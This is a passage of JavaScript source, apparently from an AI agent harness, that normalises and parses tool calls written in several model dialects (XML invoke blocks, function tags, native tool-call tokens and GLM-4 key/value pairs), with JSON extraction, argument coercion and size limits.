    .replace(/[\uFF5C\u2502]/g, '|')   // fullwidth vertical bar -> |
    .replace(/\u2581/g, '_')          // ▁ -> _
    // Qwen wraps the call in <|tool_calls_begin|> ... <|tool_calls_end|> and
    // uses <|tool_call_begin|> AS the opening marker. Map those onto the plain
    // tags rather than deleting them: stripping the begin marker too leaves no
    // opening tag at all and the call goes unrecognised.
    .replace(/<\s*\|?\s*tool_calls_(?:begin|end)\s*\|?\s*>/gi, '')
    .replace(/<\s*\|?\s*tool_call_begin\s*\|?\s*>/gi, '<|tool_call|>')
    .replace(/<\s*\|?\s*tool_call_end\s*\|?\s*>/gi, '<|/tool_call|>')
    .replace(/<\s*\|?\s*tool_sep\s*\|?\s*>/gi, ' ');
}

const NATIVE_OPEN = /<\s*\|?\s*(?:tool_call|tool-call)\s*\|?\s*>/i;
const NATIVE_CLOSE = /<\s*\|?\s*\/\s*\|?\s*(?:tool_call|tool-call)\s*\|?\s*>/i;

/**
 * Claude-style XML:
 *   <function_calls><invoke name="read_file">
 *     <parameter name="path">src/app.js</parameter>
 *   </invoke></function_calls>
 *
 * The antml: prefix is stripped by normaliseNative(). Parameter values are
 * XML-unescaped because a write_file body arrives as &lt;div&gt; otherwise.
 */
function parseInvokeToolCall(text) {
  const src = normaliseNative(text);
  const hit = /<\s*invoke\s+name\s*=\s*["']([^"']+)["']\s*>([\s\S]*?)<\s*\/\s*invoke\s*>/i.exec(src);
  if (!hit) return null;
  const name = hit[1].trim();
  if (!Object.prototype.hasOwnProperty.call(TOOL_REGISTRY, name)) return null;
  const body = hit[2];
  const arg = {};
  const paramRe = /<\s*parameter\s+name\s*=\s*["']([^"']+)["']\s*>([\s\S]*?)<\s*\/\s*parameter\s*>/gi;
  let m;
  while ((m = paramRe.exec(body)) !== null) {
    arg[m[1].trim()] = coerceArg(decodeXml(m[2].trim()));
  }
  if (!Object.keys(arg).length) {
    const inner = extractJsonObject(body);
    if (inner) {
      try {
        const parsed = JSON.parse(inner);
        if (parsed && typeof parsed === 'object' && !Array.isArray(parsed)) {
          return { tool: name, arg: parsed };
        }
      } catch { /* fall through to no-arg call */ }
    }
  }
  return { tool: name, arg: Object.keys(arg).length ? arg : undefined };
}

function decodeXml(s) {
  return String(s)
    .replace(/&lt;/g, '<')
    .replace(/&gt;/g, '>')
    .replace(/&quot;/g, '"')
    .replace(/&apos;/g, "'")
    .replace(/&amp;/g, '&');
}

/**
 * `<function=read_file><parameter=path>...</parameter></function>`.
 *
 * A bare-tag dialect some Nemotron/Qwen templates emit. It has no `name=`
 * attribute, so neither the JSON nor the invoke parser matches, and the whole
 * call reached the transcript as text (and was treated as the final answer).
 */
function parseFunctionTagToolCall(text) {
  const src = normaliseNative(text);
  const hit = /<\s*function\s*(?:=\s*|name\s*=\s*["']?)([A-Za-z_][A-Za-z0-9_-]*)\s*["']?\s*>([\s\S]*?)<\s*\/\s*function\s*>/i.exec(src);
  if (!hit) return null;
  const name = hit[1].trim();
  if (!Object.prototype.hasOwnProperty.call(TOOL_REGISTRY, name)) return null;
  const body = hit[2];
  const arg = {};
  const paramRe = /<\s*parameter\s*(?:=\s*|name\s*=\s*["']?)([A-Za-z_][A-Za-z0-9_-]*)\s*["']?\s*>([\s\S]*?)<\s*\/\s*parameter\s*>/gi;
  let m;
  while ((m = paramRe.exec(body)) !== null) {
    arg[m[1].trim()] = coerceArg(decodeXml(m[2].trim()));
  }
  if (!Object.keys(arg).length) {
    const inner = extractJsonObject(body);
    if (inner) {
      try {
        const parsed = JSON.parse(inner);
        if (parsed && typeof parsed === 'object' && !Array.isArray(parsed)) {
          return { tool: name, arg: parsed };
        }
      } catch { /* fall through to no-arg call */ }
    }
  }
  return { tool: name, arg: Object.keys(arg).length ? arg : undefined };
}

/**
 * Read a native <|tool_call|> block.
 *
 * Handles the shapes seen in the wild:
 *   <|tool_call|>read_file{"path":"x"}<|tool_call|>       name then JSON
 *   <|tool_call|>{"name":"read_file","arguments":{}}<|tool_call|>
 *   <|tool_call|>read_file<arg_key>path</arg_key>...      GLM-4 style
 *
 * An unterminated opening tag is treated as running to the end of the reply,
 * because streaming cuts the closing tag off and the call is still valid.
 */
function parseNativeToolCall(text) {
  const src = normaliseNative(text);
  const open = NATIVE_OPEN.exec(src);
  if (!open) return null;

  const rest = src.slice(open.index + open[0].length);
  const close = NATIVE_CLOSE.exec(rest);
  let body = (close ? rest.slice(0, close.index) : rest).trim();
  if (!body) return null;

  // Shape 2: the whole body is JSON.
  if (body.startsWith('{')) {
    const hit = fromToolObject(body);
    if (hit) return hit;
  }

  // Shape 3: <arg_key>k</arg_key><arg_value>v</arg_value> pairs (GLM-4 style).
  const keyed = {};
  const pairRe = /<\s*arg_key\s*>([\s\S]*?)<\s*\/\s*arg_key\s*>\s*<\s*arg_value\s*>([\s\S]*?)<\s*\/\s*arg_value\s*>/gi;
  let m;
  while ((m = pairRe.exec(body)) !== null) {
    keyed[m[1].trim()] = coerceArg(m[2].trim());
  }
  if (Object.keys(keyed).length) {
    const name = body.split(/[\s<]/)[0].trim();
    const hit = fromToolObject({ tool: name, arg: keyed });
    if (hit) return hit;
  }

  // Shape 1: tool name, then the arguments as JSON. Tolerates a second
  // closing tag appearing mid-body, which some templates emit.
  const split = /^([A-Za-z_][A-Za-z0-9_]*)\s*([\s\S]*)$/.exec(body);
  if (split) {
    const [, name, tail] = split;
    const tailTrim = NATIVE_CLOSE.test(tail) ? tail.replace(NATIVE_CLOSE, '') : tail;
    const inner = extractJsonObject(tailTrim);
    if (Object.prototype.hasOwnProperty.call(TOOL_REGISTRY, name)) {
      let arg;
      if (tailTrim.trim()) {
        if (inner) { try { arg = JSON.parse(inner); } catch { arg = tailTrim.trim(); } }
        else arg = tailTrim.trim();
      }
      return { tool: name, arg };
    }
  }

  // Bare name with no arguments: <|tool_call|>list_agents<|tool_call|>
  const bare = body.split(/[\s<|]/)[0].trim();
  if (Object.prototype.hasOwnProperty.call(TOOL_REGISTRY, bare)) {
    return { tool: bare, arg: undefined };
  }
  return null;
}

/** arg_value bodies are usually bare strings; keep numbers and JSON intact. */
function coerceArg(v) {
  const s = String(v).trim();
  if (s === 'true') return true;
  if (s === 'false') return false;
  if (s !== '' && !Number.isNaN(Number(s)) && /^-?\d+(\.\d+)?$/.test(s)) return Number(s);
  if (/^[[{]/.test(s)) { try { return JSON.parse(s); } catch { return s; } }
  return v;
}

/**
 * Find the first complete {...} block, ignoring braces inside JSON strings.
 * Returns null when the text holds no balanced object.
 */
function extractJsonObject(text) {
  const start = text.indexOf('{');
  if (start === -1) return null;
  let depth = 0;
  let inString = false;
  let escaped = false;
  for (let i = start; i < text.length; i++) {
    const ch = text[i];
    if (inString) {
      if (escaped) { escaped = false; }
      else if (ch === '\\') { escaped = true; }
      else if (ch === '"') { inString = false; }
      continue;
    }
    if (ch === '"') { inString = true; }
    else if (ch === '{') { depth++; }
    else if (ch === '}') {
      depth--;
      if (depth === 0) return text.slice(start, i + 1);
    }
  }
  return null;
}

/** Most models need a few attempts before they emit clean tool JSON. */
export const MAX_TOOL_STEPS = 8;

/**
 * Ceiling on a tool request we will even try to parse. Generous, because
 * write_file sends file content inside the JSON and a 2k cap rejected any
 * non-trivial file outright; still bounded so a runaway reply is not parsed.
 */
export const MAX_TOOL_CALL_CHARS = 100000;